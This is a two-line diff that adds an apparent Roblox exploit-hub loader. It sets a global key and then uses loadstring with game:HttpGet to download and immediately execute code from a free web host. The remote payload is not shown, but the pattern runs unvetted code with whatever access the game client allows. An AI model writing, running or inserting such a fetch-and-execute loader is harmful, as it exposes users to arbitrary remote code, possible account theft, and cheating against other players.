@@ -1,0 +1,2 @@
+_G.Key = "The_One_Piece_Is_Real"
+loadstring(game:HttpGet("https://niovatesthub.000webhostapp.com/THEONEPIECEISREAL"))()
